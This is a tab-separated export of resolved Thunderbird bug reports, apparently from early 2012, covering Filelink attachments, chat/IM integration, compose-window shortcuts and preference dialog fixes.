738241%TAB%1332396577%TAB%417358%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Preferences%TAB%Filelink account setup providers menulist should contain their respective icons%TAB%Filelink account setup providers menulist should contain their respective iconsCurrently, the list only makes reference to the providers name.  However, once a provider is selected, its icon is displayed.
738234%TAB%1332394483%TAB%403756%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Account Manager%TAB%Account provisioner success window blocks compose window password prompt%TAB%Account provisioner success window blocks compose window password promptSTR:  1)  Order a new email address from Hover.com through the account provisioner 2)  When the success window appears, choose to compose a new message. 3)  Write a message to some recipient, and send  What happens?  The sending is blocked until the success window is closed.  This is because the composer is attempting to prompt for a password, but is being blocked by the success modal window.
738194%TAB%1332385336%TAB%273994%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Message Compose Window%TAB%Composition: Add keyboard shortcuts for Zoom (Ctrl++, Ctrl+-, Ctrl+0: ux-consistency with message reader), change shortcuts for font size to Ctrl+<, Ctrl+>%TAB%Composition: Add keyboard shortcuts for Zoom (Ctrl++, Ctrl+-, Ctrl+0: ux-consistency with message reader), change shortcuts for font size to Ctrl+<, Ctrl+>In preparation for compose-in-a-tab (Bug 449299), we should make zoom behaviour and its mouse and keyboard shortcuts consistent between message reader and message composition. At the same time, we'll fix some confusing inconsistencies and bugs in the current *zoom* vs. *change font size* UI/behaviour for composition, like bug 512968. I have recently documented the current confusion in Keyboard Shortcuts Article (1), so I know what I am talking about...  For easy reading, I'll refer to windows keyboard shortcuts only. You'll can easily work out equivalents for other OS from Keyboard Shortcuts (1).  STR  1 in message reader (as in FF), zoom in/out: Ctrl++, Ctrl+- (or Ctrl+mouse wheel), and reset the zoom to 100%: Ctrl+0 2 in composition, try the same  (as in 1): 2a) zoom in/out/reset using keyboard only 2b) zoom in/out/reset using mouse+keyboard 2c) zoom in/out/reset using mouse only  Actual result  1 in message reader, everything's fine: keyboard-only zoom works nicely, as in FF: Ctrl++, Ctrl+-, Ctrl+0 (ok) mouse+keyboard: Ctrl+mouse wheel (ok) mouse only: View > Zoom menu (ok)  2 in composition, confusion and bugs:  2a zoom *keyboard only*: not possible (no keyboard shortcuts implemented for zoom) confusingly, zoom keyboard shortcuts ctrl++, ctrl+- are used to increase/decrease text size, albeit incomplete: no keyboard shortcut to reset the text size (ctrl+0 does nothing). Bug 449299 (compose in a tab) will make this even more confusing. Having different keyboard shortcuts for zoom in reader vs. composition  violates ux-consistency, and should be changed (ux-error-prevention).  2b zoom *keyboard+mouse*: Ctrl+mouse wheel (ok); but practically no reliable way of resetting zoom to 100%, bug 512968.  2c zoom *mouse only*: not possible  For people who need and use both: changing font size and zooming simultaneously, current UI/behaviour is ultimate confusion as we don't have any indication of the current zoom level nor any reliable way to reset it to 100% except guessing from sight (bug 512968). Try guessing 100% zoom for an increased font size...  Expected result (changes/improvements proposed by this bug):  * be ux-consistent * be accessible * be feature-complete  2a) *keyboard only* - use the same zoom keyboard shortcuts for composition as in message reader (and FF), especially when we can compose in a tab, bug 449299: Ctrl++, Ctrl+-, Ctrl+0 to zoom in/out/reset (anywhere); this will fix bug 512968. - implement new, distinct keyboard shortcuts for changing font size: Ctrl+> to increase font size Ctrl+< to decrease font size (and optionally, Ctrl+= to reset font size without resetting other text styles; otherwise there's Ctrl+Space to reset /all/ text styles incl. font size).  2b) *keyboard+mouse*  - basically, we're fine here, if we do 2a which will fix bug 512968. - optionally, consider adding a mouse+keyboard shortcut for resetting the zoom to 100%, so we could have: Ctrl+mouse wheel up/down: zoom in/out Ctrl+middle click (click on mouse wheel): reset zoom to 100% (or even toggle between 100% and the last custom zoom level).  2c) *mouse only* For full mouse-only access: - Add View > Zoom menu to composition window, same as message reader (easy, should be fixed in a separate bug)  (1) https://support.mozillamessaging.com/en-US/kb/keyboard-shortcuts
738052%TAB%1332338786%TAB%149052%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Theme,Test Pilot,General%TAB%Noise in the error console due to broken CSS when opening the preference window,Noise in the error console due to broken CSS when opening the preference window (in Test pilot)%TAB%Noise in the error console due to broken CSS when opening the preference window,Noise in the error console due to broken CSS when opening the preference window (in Test pilot)Warning: Expected declaration but found '/'.  Skipped to next declaration. Source File: chrome://messenger/skin/preferences/preferences.css Line: 207  The offending code is:  204 #providerForm label{ 205   width: 75px; 206   text-align: right; 207 //  padding-right: 3px; ??? 208 }  Line 207 should be removed, and a space is missing before { on line 204.
737955%TAB%1332325806%TAB%417358%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Account Manager,Preferences%TAB%Filelink: deleting a Filelink Dropbox account should delete the corresponding credentials%TAB%Filelink: deleting a Filelink Dropbox account should delete the corresponding credentialsSTR   (with Dropbox)  1 - Set up a Filelink Dropbox account with proper credentials 2 - Remove it (no other LFP registered) 3 - Add a Filelink to an email 4 - Choose Dropbox 5 - File gets uploaded  Expected behaviour - Credentials should have been deleted in step 2 and Dropbox login/signup page should be launched in step 5  Dropbox username & password remain in the saved password  This problem does not appear with YouSendIt.
737941%TAB%1332324318%TAB%417358%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Message Reader UI%TAB%Sent emails containing a Filelink appear as containing a (fake) attachment%TAB%Sent emails containing a Filelink appear as containing a (fake) attachmentSTR  - Create a Filelink - Send - Locate it in the Sent folder - It's presented as if it contained a regular attachment (21 byte long).   Expected behaviour: - Do not mark it as containing an attachment.
737870%TAB%1332313137%TAB%149052%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Instant Messaging%TAB%The "minutes of inactivity" text is cut in the Chat prefpane%TAB%The "minutes of inactivity" text is cut in the Chat prefpaneThis is because the textbox is way too big.
737466%TAB%1332231252%TAB%149052%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Instant Messaging%TAB%The Twitter icon should be their bird logo rather than a "t".%TAB%The Twitter icon should be their bird logo rather than a "t".People from twitter requested that we make this change. See for their current logos: https://twitter.com/about/resources/logos  Their logos seems to be very big, while we're actually just need a 16x16 (and resizing don't give a optimal result). Do you have a name of anyone at Twitter I can talk to in order to figure out if we can just use the favicon of twitter.com?
737396%TAB%1332221397%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Message Compose Window%TAB%Remove the unnecessary and incorrect 'service,' at the start of cloud file category definitions%TAB%Remove the unnecessary and incorrect 'service,' at the start of cloud file category definitionsIn our manifest files, the cloud providers are registered against categories with "service," at the start.  This is wrong - the cloud providers are created as instances, and the "service," never actually gets used - it just gets stripped from the id when loading the category.
737349%TAB%1332200762%TAB%417358%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Preferences%TAB%Filelink account set up should contain a link to the selected provider product description%TAB%Filelink account set up should contain a link to the selected provider product descriptionWhen selecting an online storage account provider, users don't necessarily know the product features. A link located next to the droplist should point to the selected provider feature page. If there are no selected provider, this link should point to the Filelink feature description, as per 737348
737348%TAB%1332200410%TAB%417358%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Message Compose Window%TAB%Filelink notifification should display a 'What's this ?' link to a Filelink feature description%TAB%Filelink notifification should display a 'What's this ?' link to a Filelink feature descriptionThe current Filelink notification bar can appear impromptu without the user ever heard of Filelink. In this context, a link should point to the feature description, shown in a popup window.  The help content is TBD but needs to be localized.
737080%TAB%1332148561%TAB%107247%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%General,Preferences%TAB%Some Certificates Advanced Option windows are fixed to 600x400 in size.%TAB%Some Certificates Advanced Option windows are fixed to 600x400 in size.User Agent: Mozilla/5.0 (Windows NT 5.1; rv:10.0.2) Gecko/20100101 Firefox/10.0.2 Build ID: 20120215223356  Steps to reproduce:  1.  Open 'Tools\Options'. 2.  In 'Certificates' tab open either 'View Certificates', 'Revocation Lists', or 'Security Devices'.    Actual results:  Those Certificates Advanced Option windows are fixed in size to 600x400. This is due to in Thunderbird, the file 'omni.ja\chrome\messenger\content\messenger\preferences\advanced.js', the corresponding open function the initial window size are hard coded instead of using the corresponding persisted screenX & screenY data from localstore.rdf.  Firefox does not hard code these, but Thunderbird does. -------- showCertificates: function ()   {     document.documentElement.openWindow("mozilla:certmanager", "chrome://pippki/content/certManager.xul",                                         "width=600,height=400", null);   },    showCRLs: function ()   {     document.documentElement.openWindow("mozilla:crlmanager", "chrome://pippki/content/crlManager.xul",                                         "width=600,height=400", null);   },    showOCSP: function ()   {     document.documentElement.openSubDialog("chrome://mozapps/content/preferences/ocsp.xul",                                            "", null);   },    showSecurityDevices: function ()   {     document.documentElement.openWindow("mozilla:devicemanager", "chrome://pippki/content/device_manager.xul",                                         "width=600,height=400", null);   }  ------   Expected results:  Functions showCertificates(), showCRLs(), and showSecurityDevices(), should not hard code the initial window size when they call openWindow().
737028%TAB%1332139903%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Build Config%TAB%Re-enable pedantic builds on Linux 32 bit mozconfigs%TAB%Re-enable pedantic builds on Linux 32 bit mozconfigsWay back just before we moved to libxul/ipc based builds, we had some hacks in our makefiles to get away with keep on being broken by pedantic compiler raised issues, when Firefox were disabling it for parts of libxul based builds.  The hack was to add -disable-pedantic.  We long since switched to libxul and IPC enabled builds, so we should just remove those hacks. Try server has been this way forever, if not a long time
737014%TAB%1332138361%TAB%423565%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Message Compose Window%TAB%Thunderbird Daily Does Not Add Newline Between -- And Signature,Thunderbird Daily Does Not Add Newline Between -- And Signature (plain text composition),Plaintext signatures are not received properly due to lack of BR nodes.%TAB%Thunderbird Daily Does Not Add Newline Between -- And Signature,Thunderbird Daily Does Not Add Newline Between -- And Signature (plain text composition),Plaintext signatures are not received properly due to lack of BR nodes.Using Mozilla/5.0 (Windows NT 6.1; rv:14.0) Gecko/20120318 Thunderbird/14.0a1 ID:20120318030022 for a standard account on a Mirapoint IMA4rev1 server.  I have noticed the following issue where a newline is not inserted between the "--" and the signature, or that and every line of the signature does not have their respective newlines.  Signature format: Firstname A Lastname My Work Position My Department My Institution Email: me@company.tld Office: +123 12345678 Cell: +123 12345678  My vCard format (snipped from the problematic message source):  --------------020207090705040603090106 Content-Type: text/x-vcard; charset=utf-8;  name="myworkemailhandle.vcf" Content-Transfer-Encoding: 7bit Content-Disposition: attachment;  filename="myworkemailhandle.vcf"  begin:vcard fn:Firstname A Lastname n:Lastname;Firstname org:My Institution;My Department adr:My Corporate Campus;;P.O. Box 12345;City;;12345;Country email;internet:me@company.tld title:My Work Position tel;work:+123 12345678 tel;cell:+123 12345678 url:http://www.linkedin.com/in/myuserprofile version:2.1 end:vcard   --------------020207090705040603090106--  Steps to recreate the problem:  1) Click Ctrl+N to compose a new message.  2) Enter message recipient.  3) Enter message subject.  4) Type message body content before the --, where the cursor is placed by default. After the --, Daily has automatically injected my text-only signature (which has defined per-account in Tools > Accounts Settings > Account Name > Signature text; additionally, a vCard is specified and configured to automatically attach appropriately). The signature at this point *appears correctly*.  5) Click Ctrl+Enter to send.  Desired Result:  Message has appropriately formatted signature, looking like so. -- Firstname A Lastname My Work Position My Department My Institution Email: me@company.tld Office: +123 12345678 Cell: +123 12345678  Actual result:  The newlines are stripped or never added. (See attached screenshot, signature.newline.1.png)  -- Firstname A Lastname My Work Position My Department My Institution Email: me@company.tld Office: +123 12345678 Cell: +123 12345678  Notes:  I had not reported this for a few days because it is actually difficult to recreate.  It is not happening consistently, and I am not particularly sure why.
736881%TAB%1332070170%TAB%352169%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Message Reader UI%TAB%Improve calculation of attached message size%TAB%Improve calculation of attached message sizeImprove attached message sizes  To be safe, this could use UI review. Aside from comment 0, the only significant thing I should mention is that when attached emails have attachments, the "total size" in the attachment pane isn't the sum of all sizes in the attachment list, since that would cause the inner attachment to be counted twice.  I think this is probably the best way to handle this, unless we want to hide inner attachments in the list entirely. I don't know if I want to do that though, since the current way makes it easier to get at those attachments.
736819%TAB%1332036795%TAB%282357%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Theme%TAB%statusMessage changes width when in editing mode.%TAB%statusMessage changes width when in editing mode.The statusMessage on the chat tool bar changes the width when going in editing mode. This makes jumping every element on the right of the statusMessage.
736486%TAB%1331885274%TAB%282357%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%General%TAB%Next unread message over multiple accounts with a IM account set up doesn't work%TAB%Next unread message over multiple accounts with a IM account set up doesn't workWhen I have set up for example a IRC account and then I am reading the new messages jumping to the next unread message in a news account doesn't work.  The error console shows: Error: An error occurred executing the cmd_nextUnreadMsg command: TypeError: rootFolders[i] is null Source file: chrome://global/content/globalOverlay.js Line: 100  I have multiple mail accounts, then Feeds and then two News accounts. Without a IM account I can jump through all new messages.  With a IM account I can jump between all mail accounts and Feeds but then it stops and I have to go manually to the news account to read the new messages. Also between the news accounts the automatic jump doesn't work (and also from News back to mail).  When I remove the IM account everything is working again.  Can it be it's because the IM accounts are between Mail/Feed and News placed in Account manager?
736441%TAB%1331871467%TAB%101158%TAB%RESOLVED%TAB%FIXED%TAB%Testing%TAB%General%TAB%fix test descriptions in mozmill/composition%TAB%fix test descriptions in mozmill/compositionIf you look at http://mxr.mozilla.org/comm-central/source/mail/test/mozmill/composition/ a lot of file descriptions are missing/wrong. Also true for other directories...  This fixes them for mozmill/composition.
736437%TAB%1331869216%TAB%149052%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Instant Messaging%TAB%Chat accounts without protocol plugin aren't correctly handled%TAB%Chat accounts without protocol plugin aren't correctly handledTo test this, apply the patch from bug 735215, create an XMPP account, then remove the patch from bug 735215.  The handling of this edge case doesn't have to be perfect, but I think it should at least be good enough for an user to be able to delete a leftover account.  The attached patch significantly improves the situation (the Account Settings dialog can display correctly the pane related to the account without protocol plugin), but removing the account doesn't fully work (some preferences are still there after a restart) so I'm not requesting a review yet.
736434%TAB%1331868835%TAB%149052%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Instant Messaging%TAB%Attempting to set a null username to an imIncomingServer error%TAB%Attempting to set a null username to an imIncomingServer errorThis error turns out to be because nsMsgAccountManager::GetIncomingServer gets a .userName pref that imIncomingServer.js saves as .username.  The JS stack printed by the debugger; keyword was completely useless here (it ended in gloda). I found the problem by putting a gdb breakpoint on xpc_DebuggerKeywordHandler, which gave me this stack (I removed the frames before and after which are in the JS engine):  #15 0x06c712b0 in nsCOMPtr<nsIMsgIncomingServer>::operator-> () at nsCOMPtr.h:589 #16 nsMsgAccountManager::createKeyedServer (this=0x1d089d10, key=@0xbfff884c, username=@0xbfff8760, hostname=@0xbfff8754, type=@0xbfff876c, aServer=0xbfff8874) at /Users/florian/buildhg/comm-central/mailnews/base/src/nsMsgAccountManager.cpp:590 #17 0x06c71f41 in nsMsgAccountManager::GetIncomingServer (this=0x1d089d10, key=@0xbfff884c, _retval=0xbfff8874) at /Users/florian/buildhg/comm-central/mailnews/base/src/nsMsgAccountManager.cpp:486 #18 0x06c7cf4f in nsMsgAccount::createIncomingServer (this=0x1d08da40) at /Users/florian/buildhg/comm-central/mailnews/base/src/nsMsgAccount.cpp:133 #19 0x06c7d365 in nsMsgAccount::GetIncomingServer (this=0x1d08da40, aIncomingServer=0xbfff8adc) at /Users/florian/buildhg/comm-central/mailnews/base/src/nsMsgAccount.cpp:96 #20 0x06c67b8c in nsCOMPtr<nsIMsgIncomingServer>::get () at nsCOMPtr.h:1396 #21 0x06c67b8c in ~nsGetterAddRefs [inlined] () at nsCOMPtr.h:1296 #22 nsMsgAccountManager::LoadAccounts (this=0x1d089d10) at nsCOMPtr.h:1396 #23 0x06c626ca in nsMsgAccountManager::GetAllIdentities (this=0x1d089d10, _retval=0xbfff8e80) at /Users/florian/buildhg/comm-central/mailnews/base/src/nsMsgAccountManager.cpp:1100  I wonder if this could be somehow related to bug 736035.
736155%TAB%1331804795%TAB%403756%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Preferences%TAB%Outgoing attachments management pane seems squeezed on OSX,Outgoing attachments management pane seems squeezed on OSX and Windows%TAB%Outgoing attachments management pane seems squeezed on OSX,Outgoing attachments management pane seems squeezed on OSX and WindowsCompared to Ubuntu / Windows, the management pane for an account in Outgoing Attachments seems squeezed.  See screenshot.
736055%TAB%1331788511%TAB%206599%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Message Compose Window%TAB%Various issues with FileLink,Filelink URL insertions need some adjustments and tests%TAB%Various issues with FileLink,Filelink URL insertions need some adjustments and testsHey, FileLink is now working perfectly, congrats! Here's two minor remarks.  1) Since the whole thing is about uploading large files, I think we definitely want a progress bar, or at least a percentage in the status bar, so that we know how long it will take until the file is fully uploaded.  2) If I start by FileLink'ing a file before writing anything in the compose window, there's no way for me to insert text *before* the inserted HTML. Is that intentional? Maybe we should insert a <p> before just so that the user can type text before the HTML that's inserted?  Congrats on the great feature, I love it already
736040%TAB%1331782738%TAB%112088%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Message Compose Window%TAB%When disabling Filelink in the preferences dialog, the preferences UI for accounts should also be disabled,When disabling Filelink in the preferences dialog, the preferences UI for accounts and for "Convert To" should also be disabled,When disabling Filelink, the "Convert To" attachmentitem context menuitem should be hidden%TAB%When disabling Filelink in the preferences dialog, the preferences UI for accounts should also be disabled,When disabling Filelink in the preferences dialog, the preferences UI for accounts and for "Convert To" should also be disabled,When disabling Filelink, the "Convert To" attachmentitem context menuitem should be hiddenOrganisations are likely going to be disabling Filelink for their own reasons. Users may choose to as well.  I think that if they do, then we should disable the whole of the preferences window. This makes it clear it is fully disabled.  At the moment, if I lock the preference to disable it, only the check box is disabled. I just noticed, the right-click menu in the attachments dialog isn't hidden either.
736035%TAB%1331780281%TAB%149052%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Instant Messaging%TAB%Chat accounts sometimes disappear from the Account Settings dialog%TAB%Chat accounts sometimes disappear from the Account Settings dialogSometimes the "Account Settings..." dialog loses track of *all* IM > accounts. The accounts are still listed in the "Instant messaging accounts > status" dialog though. I've seen this only once, but I know Jb has also > suffered from this problem. We do not know the steps to reproduce so I > currently can't fix it, if anybody can find steps to reproduce, that would > be awesome.  Once they have disappeared they don't reappear. By sometimes I mean "some unknown situation causes it to happen". It happened twice to me in 3 months. I know it happened at least twice to Jb too. It's a serious bug, but I don't have any steps to reproduce, so at this point I can just hope that some tester will notice it soon enough after it happened, so that he will remember what he has done immediately before and will be able to tell us.  If we still don't have any idea of the cause and approach the date of the aurora->beta merge, I guess we can hide the issue by recreating the mailnews accounts when at startup there are chat accounts without associated mailnews account, but I would really like to avoid hiding the brokenness under the carpet.
735998%TAB%1331769076%TAB%34283%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Instant Messaging%TAB%HTML entities in the latest tweet under "@<twitter-account> timeline" should be resolved to Unicode characters%TAB%HTML entities in the latest tweet under "@<twitter-account> timeline" should be resolved to Unicode charactersThe latest tweet in the timeline is shown at the top-right of the chat tab (under "@<twitter-account> timeline").  However, it doesn't resolve HTML entities such as &gt; to Unicode characters. I.e., "foo > bar" is shown as "foo &gt; bar" there. It seems we forgot to unescape the HTML entities before setting the topic when sending a tweet.
735995%TAB%1331768312%TAB%34283%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Instant Messaging%TAB%icons of twitter accounts should be shown in each tweet%TAB%icons of twitter accounts should be shown in each tweetThe icons of twitter accounts should be shown in each tweet.
735899%TAB%1331736668%TAB%149052%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%General%TAB%The "Error console" menu item should have a keyboard shortcut%TAB%The "Error console" menu item should have a keyboard shortcutFirefox and Instantbird open the Error Console when I press Command+shift+J, so I keep being surprised that it does nothing in Thunderbird. When I asked (during the work-week) if there was a reason for not having this keyboard shortcut in Thunderbird, the answer was more or less that by asking the question I was volunteering to do it, so here's a patch 
735717%TAB%1331713354%TAB%290185%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Theme%TAB%chat - toolbar icon and tab icon are different%TAB%chat - toolbar icon and tab icon are differentRight now we're using a different, non-os-specific icon for the chat tab icon. This should probably use a version of the toolbar icon instead.
735702%TAB%1331711646%TAB%306754%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Instant Messaging%TAB%The "Show Accounts" button doesn't have an icon%TAB%The "Show Accounts" button doesn't have an iconOn Windows 7/Aero, the Show Accounts button seems to be missing an icon.
735701%TAB%1331711564%TAB%306754%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Instant Messaging%TAB%Add Contact and Join Chat buttons should be disabled if no accounts are present%TAB%Add Contact and Join Chat buttons should be disabled if no accounts are presentIf no chat accounts are present, the Add Contact and Join Chat buttons are still active. They shouldn't be. Note: the status selector part of the toolbar also needs to be disabled (when there's no configured account) but it's a bit more complicated as just setting the disabled property or attribute isn't enough to obtain a satisfying behavior. Other usability issues of this status selector are covered by bug 735658 so I would rather work on this there, and do here the easy part (the Add Contact and Join Chat buttons) sooner.
735673%TAB%1331707608%TAB%290185%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Theme%TAB%chat - right sidebar splitter is fat%TAB%chat - right sidebar splitter is fatwe probably want to make it thin like the one on the left
735668%TAB%1331706959%TAB%403756%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Message Compose Window%TAB%Assertion failure / crash when linking to a YouSendIt account,Assertion failure / debug crash when linking to a YouSendIt or Dropbox account%TAB%Assertion failure / crash when linking to a YouSendIt account,Assertion failure / debug crash when linking to a YouSendIt or Dropbox accountSteps to reproduce:  1)  In a clean profile, open up the Preferences dialog 2)  Switch to the Attachment pane, and choose to add a new online storage service account 3)  Choose "YouSendIt" from the dropdown, and enter a username. 4)  When the password dialog comes up, enter the YSI account password  What happens?  We fail the following assertion:  MOZ_Assert (s=0xb5f23db0 "!(clasp->flags & (1<<((8 + 8)+2)))"  And, at least in debug builds, crash.  What's expected?  The account should be added successfully, or an error message should be displayed if authorization fails.
735658%TAB%1331704863%TAB%149052%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Instant Messaging%TAB%The status selector of the chat toolbar needs to be polished,Improve appearance and discoverability of the status selector of the chat toolbar%TAB%The status selector of the chat toolbar needs to be polished,Improve appearance and discoverability of the status selector of the chat toolbarIts not easy enough to discover how to use it.  I think we need: - a down arrow next to the icon, so that users can discover that there's a dropdown menu popup there. - a background on the status text area, so that it's easy to discover that this part isn't the label of the button on the left. I think just marking that area a little bit darker than the rest of the toolbar would do, so I would try a black but mostly transparent background. - some padding/margin fixes so that clicking in the textbox to start editing the status doesn't change the size of the status selector. I also think that we should replace the spacer between "Join Chat" and the status selector by a separator, that would look better. Not sure if Blake agrees
735642%TAB%1331701404%TAB%149052%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Instant Messaging%TAB%We need a Twitter OAuth key for Thunderbird,We need a Twitter OAuth key for Thunderbird (User-agent/UA name is Instantbird)%TAB%We need a Twitter OAuth key for Thunderbird,We need a Twitter OAuth key for Thunderbird (User-agent/UA name is Instantbird)(currently the Twitter accounts use OAuth keys from Instantbird)
735524%TAB%1331654113%TAB%257029%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Migration%TAB%Migration wizard window is blank when opened from a compose window,remove migration assistant which relates to tb2-tb3 differences%TAB%Migration wizard window is blank when opened from a compose window,remove migration assistant which relates to tb2-tb3 differencesSTR: 1. Open a new compose window by clicking the Compose button in the toolbar.  2. Then click Help > Migration wizard.  3. You find out that there's a blank window opening, as opposed to when the migration wizard is opened using the Main window.  Screencast: http://screencast.com/t/4LJnemrB  NB: I'm sorry for all the German in the screencast 
735398%TAB%1331638950%TAB%403756%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Preferences%TAB%Tabs in Attachments pane in preferences dialog don't persist last used tab causing Permanent Orange | test-attachments-pane.js | test_persist_tabs%TAB%Tabs in Attachments pane in preferences dialog don't persist last used tab causing Permanent Orange | test-attachments-pane.js | test_persist_tabsSTR:  1)  Open up the Preferences dialog, and switch to the Attachments pane. 2)  The "Outgoing" tab should be selected by default 3)  Switch to the "Incoming" tab 4)  Close the Preferences dialog 5)  Re-open the Preferences dialog  What happens?  The "Outgoing" tab is selected in the Attachments pane.  What's expected?  Since the last tab we were on was the "Incoming" tab, we should go there.  This bug is showing up as an orange on comm-central as the following error:  SUMMARY-UNEXPECTED-FAIL | test-attachments-pane.js | test-attachments-pane.js::test_persist_tabs   EXCEPTION: The first tab should have been selected: '0' != '1'.     at: test-folder-display-helpers.js line 2855        assert_true(false,"The first tab should have been selected: '0' != '1'.") test-folder-display-helpers.js 2855        assert_equals(0,1,"The first tab should have been selected") test-folder-display-helpers.js 2842             test-attachments-pane.js 42        waitForPaneLoad([object Object]) test-pref-window-helpers.js 93             frame.js 552        WindowWatcher_notify([object XPCWrappedNative_NoHelper]) test-window-helpers.js 365   EXCEPTION: The first tab selection should have been persisted: '0' != '1'.     at: test-folder-display-helpers.js line 2855        assert_true(false,"The first tab selection should have been persisted: '0' != '1'.") test-folder-display-helpers.js 2855        assert_equals(0,1,"The first tab selection should have been persisted") test-folder-display-helpers.js 2842             test-attachments-pane.js 66        waitForPaneLoad([object Object]) test-pref-window-helpers.js 93             frame.js 552        WindowWatcher_notify([object XPCWrappedNative_NoHelper]) test-window-helpers.js 365 SUMMARY-PASS | test-attachments-pane.js::teardownModule
735380%TAB%1331637612%TAB%403756%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Message Compose Window%TAB%Signature switching in plaintext compose doesn't work%TAB%Signature switching in plaintext compose doesn't workFallout from bug 698925.  STR:  1)  Have two accounts, each with a distinct signature 2)  Open a compose window in plaintext mode 3)  The compose window should have one account's signature in the body of the message 4)  Switch the "From" dropdown to the other account  What happens?  The signature does not change.  What's expected?  The signature should be updated to match the newly selected account.  This is also causing a permanent orange on comm-central.
735347%TAB%1331634246%TAB%149052%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Instant Messaging%TAB%Prefing off the IM feature should also hide the "Chat" preference pane%TAB%Prefing off the IM feature should also hide the "Chat" preference paneThe "mail.chat.enabled" pref currently prevents the IM code from being initialized, hides the IM UI from the main window ("Chat" button in the toolbar; menu items) and from the Account Settings dialog (hides IM accounts from the list and hides the "Add Chat account…" menu item), but the "Chat" prefpane is still visible in the pref window.
735339%TAB%1331633663%TAB%149052%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Instant Messaging%TAB%The 'Get mail' drop down shouldn't list IM accounts%TAB%The 'Get mail' drop down shouldn't list IM accountsas it's not possible to get new emails from an IM account.
735335%TAB%1331633394%TAB%149052%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Instant Messaging%TAB%Participant list of IRC channels isn't finished%TAB%Participant list of IRC channels isn't finished- The tooltips (supposed to display whois results) don't work: Error: document.getBindingParent(elt) is null Source File: chrome://messenger/content/chat/imbuddytooltip.xml Line: 398  - double clicking on a nick to start a private conversation doesn't work: Error: onNickClick is not defined Source File: chrome://messenger/content/messenger.xul Line: 1  - pressing enter to start a private conversation with the selected nick doesn't work: Error: onNicklistKeyPress is not defined Source File: chrome://messenger/content/messenger.xul
735331%TAB%1331633137%TAB%149052%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Instant Messaging%TAB%"Rename" in the context menu of a contact doesn't work%TAB%"Rename" in the context menu of a contact doesn't workMost of the code is here (copied from Instantbird), but the adaptation for Thunderbird isn't finished.
735301%TAB%1331629914%TAB%273994%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Instant Messaging%TAB%IM in TB: Refocus chat tab does not update window caption; improve chat tab caption%TAB%IM in TB: Refocus chat tab does not update window caption; improve chat tab captionSTR  current TB 13 trunk with IM client without any IM accounts set up yet  1 press Chat button from Mail toolbar to open chat tab 2 observe chat tab caption and window caption 3 Open another tab, e.g. Tools > Addons 4 refocus chat tab 5 observe chat tab caption vs. window caption  Actual result  2: chat tab caption has "Chat - Search result": Why "Search result"?? At least for this "no chat accounts yet" scenario this really doesn't make sense, and is confusing. I doubt it makes any more sense when I populate the chat window with whatever belongs there... But at least the tab caption is congruent with the window caption, but not for long...  5: after refocussing the chat tab, window caption doesn't update: still showing the window caption of the previously focused tab, here: "Add-ons Manager". Which is not a good window caption for the chat tab which has focus.
735292%TAB%1331629024%TAB%273994%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Instant Messaging%TAB%IM in TB: Fix wrong focus; improve focus ring and initial focus with no chat accounts set up%TAB%IM in TB: Fix wrong focus; improve focus ring and initial focus with no chat accounts set upSTR  current TB 13 trunk with IM client without any IM accounts set up yet  1 view random msg in main 3pane 2 press Chat button from Mail toolbar 3a) without any IM accounts set up yet, press Enter (hoping to press that only lonely button in the middle of the screen: "Get started")  3b) alternatively: having discovered bad behaviour after 3a), try to it right by using <tab> to manually set focus on the button "Get started"  Actual result  3a) surprise: the selected email from main mail tab pops up in a new tab after the chat tab; i.e. although the Chat tab is in the foreground, focus is still on the previous tab (bad, guess all sorts of things could happen there).  3b) the focus ring is really bad for this scenario with no chat accounts set up yet: 1: no initial focus (because of 3a, it's still on another tab) - here are the following <tab> stops in their current order: 2: nothing (bad) 3: nothing (bad) 4: focus now in "Search all conversations" 5: nothing again (bad) 6: focus now on "Get started" button (wow, that's 5 x <tab> to get to the only useful ui element in this scenario) 6: focus on tab caption  Expected result  3a) after showing Chat tab, ensure the focus is here, too (see 3b)  3b) - Expected Focus ring with no accounts set up (hence initial screen with "You haven't set up..." info only): 1: initial focus in this scenario (no chat accts yet) should be on "Get Started" button, as that's the only useful/possible option in this scenario 2: Tab caption 3: "Search all convsersations" then loop back to 1 ("Get Started") All other tab stops are not 